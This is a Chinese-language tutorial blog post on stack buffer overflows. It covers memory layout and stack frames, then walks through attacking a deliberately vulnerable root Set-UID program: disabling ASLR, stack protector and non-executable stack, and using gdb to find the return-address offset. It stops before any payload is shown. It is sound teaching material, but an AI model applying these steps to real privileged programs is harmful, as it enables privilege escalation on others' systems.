    <content type="html"><![CDATA[<p>Buffer Overflow Attack ，part1：基本原理</p><span id="more"></span><h2 id="Buffer-Overflow-Attack-buffer溢出攻击"><a href="#Buffer-Overflow-Attack-buffer溢出攻击" class="headerlink" title="Buffer Overflow Attack buffer溢出攻击"></a>Buffer Overflow Attack buffer溢出攻击</h2><p>从1988年的莫里斯蠕虫，2001年的红色代码蠕虫，2003年的SQLSlammer到2015年对安卓手机的快速攻击，buffer溢出攻击在计算机安全的历史上发挥了重要作用。这是一种经典的攻击，它对许多计算机系统和应用程序仍然有效。</p><h3 id="1-程序的内存memory布局"><a href="#1-程序的内存memory布局" class="headerlink" title="1. 程序的内存memory布局"></a>1. 程序的内存memory布局</h3><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649001478958.png" alt="uTools_1649001478958"></p><p>memory分成5个段，每个段有各自的功能：</p><ol><li>文本段Text segment：存储该程序的可执行代码。这个内存块通常是只读的。</li><li><p>数据段Data segment：存储由程序员初始化的静态/全局变量。例如，在static int a=3中定义的变量a将存储在数据段中。</p></li><li><p>BSS段：存储未初始化的静态/全局变量。这个段将被操作系统填充为零，因此所有未初始化的变量都用零初始化。例如，在static int b中定义的变量b将存储在BSS段中，并被初始化为零。</p></li><li><p>堆Heap：提供动态memory分配的空间，由malloc，calloc，realloc，free管理</p></li><li>栈Stack：该堆栈用于存储在函数中定义的局部变量，以及存储与函数调用相关的数据，如返回地址、参数等。</li></ol><h3 id="2-堆栈和功能调用"><a href="#2-堆栈和功能调用" class="headerlink" title="2. 堆栈和功能调用"></a>2. 堆栈和功能调用</h3><p>在stack和heap上都可能发生buffer溢出。而利用它们的方法则截然不同。我们将重点介绍基于堆栈的buffer溢出。为了理解它是如何工作的，我们需要深入了解Stack是如何工作的，以及Stack上存储了什么信息。</p><h4 id="2-1-栈内存布局"><a href="#2-1-栈内存布局" class="headerlink" title="2.1 栈内存布局"></a>2.1 栈内存布局</h4><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649002904880.png" alt="uTools_1649002904880"></p><p>当调用func()时，将在堆栈的顶部分配一个内存空间块，并被称为堆栈帧。堆栈框架的布局如图4.2所示。一个堆栈框架具有四个重要区域：</p><ul><li><p>参数：此区域存储了传递给该函数的参数的值。在我们的例子中，func()有两个整数参数。当调用这个函数时，例如，func（5,8），参数的值将被推入堆栈中，形成堆栈帧的开始。需要注意的是，参数是按相反的顺序推送的；原因将在我们引入帧指针的后面讨论。</p></li><li><p>返回地址：当函数完成并命中其返回指令时，它需要知道返回到哪里，即，返回地址需要存储在某个地方。在跳到函数的入口之前，计算机将下一条指令的地址——直接放置在函数调用指令之后的指令——推到堆栈的顶部，这是堆栈帧中的“返回地址”区域。</p></li><li>上一帧指针：程序推到堆栈帧中的下一项是前一帧的帧指针。我们将在4.2.2中更详细地讨论框架指针。</li><li>局部变量：下一个区域是用于存储函数的局部变量。该区域的实际布局，如局部变量的顺序、区域的实际大小等，都取决于编译器。一些编译器可能会随机化局部变量的顺序，或者为这个区域给出额外的空间[Bryant和奥哈拉伦，2015]。程序员不应该为这个区域承担任何特定的顺序或大小</li></ul><h4 id="2-2-帧指针Frame-Pointer"><a href="#2-2-帧指针Frame-Pointer" class="headerlink" title="2.2 帧指针Frame Pointer"></a>2.2 帧指针Frame Pointer</h4><p>在func()中，我们需要访问参数和局部变量。唯一的方法就是知道他们的内存地址。不幸的是，在编译期间无法确定地址，因为编译器无法预测堆栈的运行时状态，也无法知道堆栈帧将在哪里。为了解决这个问题，在CPU中引入了一种特殊的寄存器。它被称为帧指针Frame  Pointer。这个寄存器指向堆栈帧中的一个固定位置，因此可以使用这个寄存器和一个偏移量来计算每个寄存器和局部变量的地址。偏移量可以在编译期间确定，而帧指针的值可以在运行期间发生变化，这取决于堆栈帧在堆栈上分配的位置。</p><p>在x86体系结构中，帧指针寄存器(ebp)总是指向存储前一个帧指针的区域。对于32位体系结构，返回地址和帧指针都占用4字节的内存，因此变量a和b的实际地址分别为ebp+8和ebp+12。</p><p>下面是对应的C代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line">x = a + b;</span><br><span class="line">y = a - b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是执行x=a+b的汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl 12(%ebp), %eax ; b is stored in %ebp + 12</span><br><span class="line">movl 8(%ebp), %edx ; a is stored in %ebp + 8</span><br><span class="line">addl %edx, %eax</span><br><span class="line">movl %eax, -8(%ebp) ; x is stored in %ebp - 8</span><br></pre></td></tr></table></figure><ul><li>值得注意的是，变量x实际上是由编译器在帧指针下方分配的8个字节，而不是如图所示的4个字节。正如我们已经提到的，<strong>局部变量区域的实际布局由编译器决定</strong>。在汇编代码中，我们可以从-8(%ebp)中看到，变量x存储在%ebp-8的位置上。因此，使用在运行时决定的帧指针和在编译时决定的偏移量，我们可以找到所有变量的地址。</li></ul><p><strong>Previous frame pointer 和函数调用链：</strong></p><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649045256141.png" alt="uTools_1649045256141"></p><p>(看图，Current Frame Pointer指向的就是Previous Frame Pointer对应位置，而Previous Frame Pointer)就是父函数的Frame Pointer值，保证了子函数返回运行结束返回父函数的时候可以找到父函数的Current Frame Pointer。</p><h3 id="3-Stack-Buffer-Overflow-Attack"><a href="#3-Stack-Buffer-Overflow-Attack" class="headerlink" title="3. Stack Buffer-Overflow Attack"></a>3. Stack Buffer-Overflow Attack</h3><p>内存复制在程序中非常常见，其中需要将来自一个地方(源）的数据复制到另一个地方(目的地）。在复制之前，程序需要为目标分配内存空间。有时，程序员可能会犯错误，无法为目标分配足够的内存量，因此，复制到目标buffer的数据将比分配的空间量更多。这将导致溢出。</p><p>有些语言，比如Java，可以在buffer溢出时自动检测到问题，但许多其他语言，如C和C++无法检测到它。大多数人可能认为buffer溢出可能造成的唯一破坏是程序崩溃，因为buffer之外的数据崩溃；然而，令人惊讶的是，这样一个简单的错误可能会使攻击者获得对程序的完全控制，而不是简单地使它崩溃。如果一个易受攻击的程序以特权运行，攻击者将能够获得这些特权。在本节中，我们将解释这种攻击是如何工作的。</p><h4 id="3-1-数据复制到Buffer"><a href="#3-1-数据复制到Buffer" class="headerlink" title="3.1 数据复制到Buffer"></a>3.1 数据复制到Buffer</h4><p>C中复制数据的函数有：strcpy(), strcat(), memcpy()等，我们演示用strcpy()的问题进行攻击。</p><p>strcpy()函数当且仅当在读到’\0’才会停止复制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> src[<span class="number">40</span>]=<span class="string">&quot;Hello world \0 Extra string&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> dest[<span class="number">40</span>];</span><br><span class="line"><span class="comment">// copy to dest (destination) from src (source)</span></span><br><span class="line"><span class="built_in">strcpy</span> (dest, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上述代码，这个函数strcpy()在”\0”就停下了，因此extra string部分不会出现在dest中</p><h4 id="3-2-Buffer-Overflow"><a href="#3-2-Buffer-Overflow" class="headerlink" title="3.2 Buffer Overflow"></a>3.2 Buffer Overflow</h4><p>当我们将字符串复制到目标buffer时，如果字符串超过buffer的大小，会发生什么？让我们来看看下面的例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">12</span>];</span><br><span class="line"><span class="comment">/* The following statement will result in a buffer overflow */</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *str = <span class="string">&quot;This is definitely longer than 12&quot;</span>;</span><br><span class="line">foo(str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stack分布如下：</p><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649047692648.png" alt="uTools_1649047692648"></p><p>可以看到，虽然Stack的延申方向是从高地址到低地址，但是数组buffer[]的延申方向还是从低到高地址。buffer还是沿正常的方向增长（从低到高），当我们复制数据到buffer[]时，我们从buffer[0]开始，并最终复制到buffer[11]。如果还有更多的数据要复制，strcpy()将继续将数据复制到buffer上方的区域，将buffer之外的内存视为buffer[12]、buffer[13]等等。</p><p>如图4.4所示，buffer上方的区域有重要信息，包括return address和previous frame pointer。return address会影响函数返回时程序应该跳转到的（在text segment上的对应）位置。如果返回地址字段由于缓冲区溢出而被修改，那么当函数返回时，它将返回到一个新的位置。</p><p>这样的话就有几件事可能会发生。</p><ul><li>首先，新地址是一个虚拟地址，可能不会映射到任何物理地址，因此返回指令将失败，程序将崩溃。</li><li>其次，地址可以映射到物理地址，但地址空间受到保护，比如操作系统内核使用的地址；跳转会失败，程序会崩溃。</li><li>第三，该地址可以被映射到一个物理地址，但该地址中的数据不是一个有效的机器指令（例如，它可能是一个数据区域）；返回程序将再次失败，程序也将再次失败</li><li><strong>第四，地址中的数据可能碰巧是一个有效的机器指令，所以程序将继续运行，但程序的逻辑将与原来的逻辑不同。</strong></li></ul><h4 id="3-3-利用-Buffer-Overflow-漏洞"><a href="#3-3-利用-Buffer-Overflow-漏洞" class="headerlink" title="3.3 利用 Buffer Overflow 漏洞"></a>3.3 利用 Buffer Overflow 漏洞</h4><p>正如我们从上面的结果中所看到的，通过溢出一个缓冲区，我们可以导致一个程序崩溃或运行一些其他代码。从攻击者的角度来看，后者听起来更有趣，特别是如果我们（作为攻击者）能够控制要运行的代码，因为这将允许我们劫持程序的执行。如果一个程序是有特权的，那么能够劫持该程序就会导致攻击者的特权升级。</p><p>让我们看看如何让一个易受攻击的程序来运行我们的代码。在前面的程序示例中，该程序不从外部获取任何输入，因此即使存在缓冲区溢出问题，攻击者也不能利用它。在实际的应用程序中，程序通常从用户那里获得输入。请参阅以下程序示例(stack.c)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This program has a buffer overflow vulnerability. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"><span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">400</span>];</span><br><span class="line">FILE *badfile;</span><br><span class="line">badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">300</span>, badfile);</span><br><span class="line">foo(str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述程序从一个名为“badfile”的文件中读取300字节的数据，然后将该数据复制到一个大小为100的缓冲区中。显然，存在一个缓冲区溢出问题。这一次，复制到缓冲区的内容来自于用户提供的文件，即，用户可以控制复制到缓冲区的内容。</p><p>问题是要在“badfile”中存储什么，从而在溢出缓冲区之后，我们可以让程序来运行我们的代码。</p><p>我们需要首先将我们的代码（即恶意代码）放入正在运行的程序的内存中。这并不难。我们可以简单地将代码放在“badfile”中，因此当程序读取文件时，代码被加载到str[]数组中；当程序将str复制到目标缓冲区时，代码将存储在Stack中。在图4.5中，我们将恶意代码放在“坏文件”的末尾。</p><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649054410622.png" alt="uTools_1649054410622"></p><p>接下来，我们需要强制程序跳转到我们的代码中，它已经在内存中了。为此，使用代码中的缓冲区溢出问题，我们可以覆盖返回地址字段。如果我们知道恶意代码的地址，我们就可以简单地使用这个地址来覆盖返回地址字段。因此，当函数foo返回时，它将跳转到新地址，即存储代码的位置。图4.5说明了如何让程序跳转到我们的代码中。</p><p>在理论上，这就是缓冲区溢出攻击的工作方式。实际上，它要复杂得多。在接下来的几节中，我们将描述如何对清单4.1中描述的脆弱的Set-UID程序实际启动缓冲区溢出攻击。我们将描述攻击中的挑战以及如何克服它们。我们的目标是通过利用特权程序中的缓冲区溢出漏洞来获得根特权。</p><h3 id="4-实验前设置"><a href="#4-实验前设置" class="headerlink" title="4. 实验前设置"></a>4. 实验前设置</h3><p>我们将在我们的Ubuntu16.04虚拟机内进行攻击实验。由于缓冲区溢出问题有很长的历史，大多数操作系统已经开发出了针对这种攻击的对策。为了简化我们的实验，我们首先需要关闭这些对策。稍后，我们将重新启用它们，并表明其中一些对策只会使攻击变得更加困难，而不是将buffer overflow攻击变成不可能。我们将展示他们如何才能被攻破。</p><h4 id="4-1Disable-Address-Randomization"><a href="#4-1Disable-Address-Randomization" class="headerlink" title="4.1Disable Address Randomization"></a>4.1Disable Address Randomization</h4><p>针对缓冲区溢出攻击的对策之一是地址空间布局随机化攻击(ASLR)[维基百科，2017b]。它将进程中关键数据区域的内存空间随机化，包括the base of the executable和堆heap、栈stack和库library的位置，这使得攻击者很难猜测注入的恶意代码的地址。我们将在4.9中讨论这一对策，并展示如何击败它。对于这个实验，我们将简单地使用以下commad来关闭它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><h4 id="4-2-Vulnerable-Program"><a href="#4-2-Vulnerable-Program" class="headerlink" title="4.2 Vulnerable Program"></a>4.2 Vulnerable Program</h4><p>我们的目标是利用Set-UID根程序中的缓冲区溢出漏洞。Set-UID根程序在正常用户执行时使用根权限运行，在正常程序时给予正常用户额外的特权。如果在具有特权的Set-UID根程序中可以利用缓冲区溢出漏洞，那么如果注入的恶意代码被执行，则可以使用根程序的权限运行。我们将使用上面所示的脆弱程序(stack.c)作为我们的目标程序。这个程序可以使用以下命令被编译并转换为一个root-owned的Set-UID程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -o stack -z execstack -fno-stack-protector stack.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chown root stack</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod 4755 stack</span></span><br></pre></td></tr></table></figure><p>第一个命令编译stack.c，第二个和第三个命令将executable stack转换为root-owned的Set-UID程序。</p><p>需要注意，第2，3条command是不能反过来的，因为当chown命令更改文件的所有权时，它会出于安全考虑清空Set-UID位。在第一个命令gcc中，我们使用了两个gcc选项来关闭已经内置到gcc编译器中的两个对付buffer overflow对策。</p><ul><li>-z execstack：默认情况下，stack是”不可执行”的，这可以防止注入的恶意代码被执行。这种对策被称为non-executable stack[维基百科，2017o]。一个程序，通过在二进制文件中的一个特殊标记，可以告诉操作系统其stack是否应该设置为可执行的。二进制文件中的标记通常由编译器来完成。gcc编译器默认将stack标记为non-executable，“-z execstack”选项将此相反，使堆栈可执行。(实际上，这个对策可以用return-to-libc攻击化解)</li><li>-fno-stack-protector：这个选项关闭了另一种被称为栈保护器的对策[Cowa等人，1998]，它可以击败基于栈的缓冲区溢出攻击。它的主要思想是向代码中添加一些特殊的数据和检查机制，这样当发生缓冲区溢出时，它就会被检测到。</li></ul><p>为了理解这个程序的行为，我们将一些随机的内容放在坏文件中。我们可以注意到，当文件的大小小于100字节时，程序将运行没有问题。但是，当我们在文件中放置超过100个字节时，程序可能会崩溃。这是我们在发生缓冲区溢出时所期望的结果。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;aaaa&quot;</span> &gt; badfile</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./stack</span></span><br><span class="line">Returned Properly</span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br><span class="line"><span class="bash">$ <span class="built_in">echo</span> <span class="string">&quot;aaa ...(100 characters omitted)... aaa&quot;</span> &gt; badfile</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./stack</span></span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><h3 id="5-执行-Buffer-Overflow-攻击"><a href="#5-执行-Buffer-Overflow-攻击" class="headerlink" title="5.执行 Buffer-Overflow 攻击"></a>5.执行 Buffer-Overflow 攻击</h3><p>我们的目标是利用易受攻击的程序stack.c中的缓冲区溢出漏洞，它使用root权限运行。我们需要构建badfiile，这样当程序将文件内容复制到一个缓冲区时，缓冲区被覆盖，我们注入的恶意代码可以被执行，允许我们获得一个root shell。本节将首先讨论攻击中的挑战，然后详细介绍我们如何克服这些挑战。</p><h4 id="5-1-Finding-the-Address-of-the-Injected-Code"><a href="#5-1-Finding-the-Address-of-the-Injected-Code" class="headerlink" title="5.1 Finding the Address of the Injected Code"></a>5.1 Finding the Address of the Injected Code</h4><p>为了能够跳转到我们的恶意代码，我们需要知道恶意代码的内存地址。不幸的是，<strong>我们不知道我们的恶意代码到底在哪里</strong>。我们只知道我们的代码被复制到栈上的目标缓冲区中，但我们<strong>不知道缓冲区的内存地址，因为它的确切位置取决于程序的栈使用情况</strong>。</p><p>我们知道输入中恶意代码的偏移量，但我们需要知道函数foo的stack frame地址，以准确地计算我们的代码将被存储的位置。不幸的是，目标程序不太可能打印出其”帧指针”的值或帧内任何变量的地址，这让我们别无选择，只能猜测。理论上，一个随机猜测的整个搜索空间是$2^{32}$个地址（对于32位的机器），但在实际应用中，这个空间要小得多。</p><p>有两个事实使得搜索空间很小。</p><ul><li>首先，在引入对策之前，大多数操作系统将堆栈（每个进程都有一个）放置在一个固定的起始地址上。需要注意的是，该地址是一个虚拟地址，它被映射到不同进程的不同物理内存地址。因此，对于不同的进程为其堆栈使用相同的虚拟地址，也不会存在冲突。</li><li>其次，大多数程序都没有很深的堆栈。从图4.3中，我们可以看到，如果函数调用链很长，堆栈可以变得更深，但这种情况通常发生在递归函数调用中。通常，调用链不是很长，所以在大多数程序中，堆栈都很浅。结合第一个和第二个事实，我们可以看出搜索空间比232要小得多，所以猜测正确的地址应该很容易</li></ul><p>为了验证Stack总是从一个固定的起始地址开始，我们使用以下程序来打印出一个函数中的一个本地变量的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>* a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; :: a1’s address is 0x%x \n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>) &amp;a1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">3</span>;</span><br><span class="line">func(&amp;x);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在<strong>关闭地址随机化的情况下运行上述程序</strong>。从下面的执行跟踪中，我们可以看到<strong>变量的地址总是相同的，这表明Stack的起始地址总是相同的</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo sysctl -w kernel.randomize_va_space=0</span></span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc prog.c -o prog</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./prog</span></span><br><span class="line">:: a1’s address is 0xbffff370</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./prog</span></span><br><span class="line">:: a1’s address is 0xbffff370</span><br></pre></td></tr></table></figure><h4 id="5-2-Improving-Chances-of-Guessing"><a href="#5-2-Improving-Chances-of-Guessing" class="headerlink" title="5.2 Improving Chances of Guessing"></a>5.2 Improving Chances of Guessing</h4><p>为了使我们的猜测成功，我们需要猜测我们注入的代码的确切入口点entry point。如果我们错过了哪怕一个字节，我们都会失败。如果我们可以<strong>为注入的代码创建许多入口点</strong>，从任何一个入口点都能进入程序，这样成功率就会提高很多。其想法是在代码的实际入口点之前添加许多<strong>No-Op(NOP)指令</strong>。NOP指令没有做任何有意义的事情，除了将程序计数器（program counter，即PC）推进到下一个位置，所以<strong>只要我们击中任何一个NOP指令，我们最终都会跳转到我们的代码的真正的入口点</strong>。这将大大提高我们的成功率。想法说明图如下：</p><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649059359839.png" alt="uTools_1649059359839"></p><p>通过用NOP值填充返回地址上方的区域，我们可以为恶意代码创建多个入口点。这一点如图4.6的右侧所示。右侧可以与左侧的情况进行比较，左侧没有使用NOP，从而它的恶意代码只有一个入口点。</p><h4 id="5-3-Finding-the-Address-Without-Guessing"><a href="#5-3-Finding-the-Address-Without-Guessing" class="headerlink" title="5.3 Finding the Address Without Guessing"></a>5.3 Finding the Address Without Guessing</h4><p>在Set-UID案例中，由于攻击者在同一台机器上，他们可以获得受害者程序的副本，做一些调查，并无需猜测就能获得注入代码的地址。此方法可能不适用于远程攻击，即攻击者试图从远程机器注入代码。远程攻击者可能没有受害者程序的副本，他们也不能对目标机器进行调查。<br>我们将使用一种调试方法来找出堆栈框架在堆栈上所在的什么位置，并使用它来推导我们的代码所在的位置。我们可以直接调试Set-UID程序，并在调用foo时打印出帧指针的值。需要注意的是，当普通用户调试特权Set-UID程序时，程序不会以特权运行，因此直接更改调试器内部程序的行为不允许我们获得任何特权。</p><p>在这个实验中，我们有了目标程序的源代码，所以我们可以在打开调试标志的情况下编译它。这将使它更方便地进行调试。这是gcc命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c</span></span><br></pre></td></tr></table></figure><p>除了像以前一样禁用两个对策之外，上述编译还使用-g标志来编译程序，这样的话，调试信息被添加到二进制文件中。之后编译出的程序stack_dbg之后就会用gdb调试。在运行程序前我们先创建一个badfile文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch badfile</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gdb stack_dbg</span></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1˜16.04) 7.11.1</span><br><span class="line">......</span><br><span class="line">(gdb) b foo                   # Set a break point at function foo()</span><br><span class="line">Breakpoint 1 at 0x804848a: file stack.c, line 14.</span><br><span class="line">(gdb) run</span><br><span class="line">......</span><br><span class="line">Breakpoint 1, foo (str=0xbfffeb1c &quot;...&quot;) at stack.c:10</span><br><span class="line">10 strcpy(buffer, str);</span><br></pre></td></tr></table></figure><p>在gdb中，我们敲入b foo来在foo函数处设置断点，之后我们用run运行程序，程序会在foo函数里面停下，这时我们就可以print出 frame pointer帧指针 ebp ，用gdb的p命令打印出buffer的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p $ebp</span><br><span class="line">$1 = (void *) 0xbfffeaf8</span><br><span class="line">(gdb) p &amp;buffer</span><br><span class="line">$2 = (char (*)[100]) 0xbfffea8c</span><br><span class="line">(gdb) p/d 0xbfffeaf8 - 0xbfffea8c</span><br><span class="line">$3 = 108</span><br><span class="line">(gdb) quit</span><br></pre></td></tr></table></figure><p>从上面的执行结果中，我们可以看到帧指针frame pointer的值是0xbfffeaf8。因此，根据图4.6，我们可以看出返回地址return address存储在0xbfffeaf8+4中，并且第一个可以让我们跳转到我们自己的代码的位置为0xbfffeaf8+8(从这个地址开始的内存区域充满了NOP，可以一路跳到我们想要的地方)。因此，我们可以在返回地址return address字段中放置0xbfffeaf8+8。</p><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649054410622.png" alt="uTools_1649054410622"></p><p>在输入的内部，返回地址字段在哪里？因为我们的输入将从缓冲区的一开始就被复制到缓冲区中。我们需要知道缓冲区在内存中的什么位置开始，以及缓冲区的起始点和返回地址字段之间的距离。从上面的调试结果中，我们可以很容易地打印出缓冲区的地址，然后计算出ebp与缓冲区的起始地址之间的距离 (我们得到108) 由于返回地址字段比ebp指向的位置高出4个字节(ebp指向的是previous frame pointer，return address在这个上面)，所以buffer起始位置和return address位置的距离是112。</p><h4 